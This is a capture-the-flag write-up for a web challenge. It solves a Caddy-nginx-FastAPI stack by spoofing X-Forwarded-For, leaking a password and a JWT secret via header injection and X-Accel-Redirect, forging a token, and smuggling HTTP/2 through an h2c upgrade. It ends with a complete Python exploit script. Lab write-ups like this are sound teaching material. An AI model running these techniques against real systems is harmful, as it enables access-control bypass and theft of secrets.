---
title: "Duck Smuzzle"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "A Caddy -> nginx -> FastAPI stack where an IP-allowlist WAF is bypassed by spoofing X-Forwarded-For, the JWT secret is leaked via X-Accel-Redirect, and /duck is reached by smuggling raw HTTP/2 streams through an h2c upgrade."
icon: "🦆"
---

## Summary
A three-layer proxy stack (Caddy -> nginx -> FastAPI + fastapi-guard) gates `/duck` behind an IP allowlist. The solve chains an `X-Forwarded-For` spoof, an `operationId` leak in `/openapi.json`, an `X-Accel-Redirect`-based JWT-secret leak, a forged `role=duck` token, and finally h2c request smuggling to tunnel raw HTTP/2 past Caddy's path matcher while keeping the spoofed XFF intact.

## Solution

I'd seen the "blocked path that's still reachable somehow" shape before, so I set the direction early: this was going to be a proxy-confusion problem, and the flavor text (`wh0_smuggl3_my_403`) basically announced smuggling. My job was steering and verifying; I let the model do the grinding through each layer.

First I had the model triage the stack from the provided configs. It mapped out that the real "WAF" wasn't Caddy or nginx but `fastapi-guard`, configured with `whitelist=["67.67.67.67"]` and `exclude_paths=["/goose","/flag"]` — which explained why only `/goose//flag` was reachable. I prompted it to test the obvious trust bug: the guard trusts the *first* `X-Forwarded-For` entry, so spoofing `X-Forwarded-For: 67.67.67.67` straight at nginx (port 81) let us read `/openapi.json`. From there the model spotted that FastAPI's `operationId` had preserved the `/duck` handler's function name — which the Dockerfile had swapped for the random password token `d8XAO6H7enCGx5V4fWhsBvgztyPNEbKq`.

Next was the JWT secret. The model found that `/flag` supports a `response.headers[x]=y` injection (gated by that password). I had it abuse this to set `X-Accel-Redirect: /private`, making nginx hand back the internal `.jwtenv` file and leak `JWT_SECRET`. We then forged an HS256 JWT `{"role":"duck"}` with it. Its first wrong turn: it tried `dev_secret` and the password-as-secret out of habit — both returned "quack". I caught that and made it re-pull the *actual* leaked secret, which is what finally worked.

The last layer was the smuggle. Both proxies block `/duck*` and Caddy strips spoofed XFF — but an HTTP/1.1 `Upgrade: h2c` (the `101` response) opens a raw HTTP/2 tunnel to the backend, sidestepping Caddy's path matcher and preserving our attacker-controlled XFF. I verified the mechanism cleanly before trusting it: `/openapi.json` over the tunnel with spoofed XFF returned `200`, and `403` without — proof the tunnel carried our header. Then the smuggled `GET /duck?password=...` with the forged cookie returned the flag.

```python
import socket, ssl, json, hmac, hashlib, base64, h2.connection, h2.config

HOST, PORT = "duck.v1t.ctf", 80          # Caddy front (h2c enabled)
NGINX = ("duck.v1t.ctf", 81)             # nginx, trusts first XFF
XFF = "67.67.67.67"                       # fastapi-guard allowlisted IP

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

# --- raw HTTP/1.1 helper straight to nginx (XFF spoof) -----------------------
def nginx_get(path, extra=b""):
    s = socket.create_connection(NGINX)
    req = (f"GET {path} HTTP/1.1\r\nHost: {NGINX[0]}\r\n"
           f"X-Forwarded-For: {XFF}\r\nConnection: close\r\n").encode() + extra + b"\r\n"
    s.sendall(req)
    data = b""
    while chunk := s.recv(4096): data += chunk
    s.close()
    return data.decode(errors="replace")

# 1) leak the password from openapi operationId
spec = nginx_get("/openapi.json")
body = spec.split("\r\n\r\n", 1)[1]
password = json.loads(body)["paths"]["/duck"]["get"]["operationId"]
print("[+] password:", password)

# 2) leak JWT secret: /flag header-injection -> X-Accel-Redirect: /private
inj = f"/flag?password={password}&response.headers[X-Accel-Redirect]=/private"
leak = nginx_get(inj)
jwt_secret = leak.split("JWT_SECRET=", 1)[1].split()[0]
print("[+] JWT secret:", jwt_secret)

# 3) forge HS256 JWT {"role":"duck"} with the real leaked secret
hdr = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
pay = b64u(json.dumps({"role": "duck"}, separators=(",", ":")).encode())
sig = b64u(hmac.new(jwt_secret.encode(), hdr + b"." + pay, hashlib.sha256).digest())
token = (hdr + b"." + pay + b"." + sig).decode()
print("[+] token:", token)

# 4) h2c smuggle: HTTP/1.1 Upgrade -> 101 -> raw HTTP/2 stream to backend
s = socket.create_connection((HOST, PORT))
s.sendall(
    f"GET / HTTP/1.1\r\nHost: {HOST}\r\nConnection: Upgrade, HTTP2-Settings\r\n"
    f"Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n".encode()
)
assert b"101" in s.recv(4096)             # tunnel established

conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
conn.initiate_upgrade_connection(); s.sendall(conn.data_to_send())
conn.send_headers(1, [
    (":method", "GET"),
    (":path", f"/duck?password={password}"),
    (":authority", HOST), (":scheme", "http"),
    ("x-forwarded-for", XFF),             # preserved through the tunnel
    ("cookie", f"role={token}"),
], end_stream=True)
s.sendall(conn.data_to_send())

flag = b""
while chunk := s.recv(4096):
    for ev in conn.receive_data(chunk):
        if isinstance(ev, h2.events.DataReceived): flag += ev.data
        if isinstance(ev, h2.events.StreamEnded): s.close()
print("[FLAG]", flag.decode(errors="replace"))
```

## Flag
```
v1t{wh0_smuggl3_my_403}
```
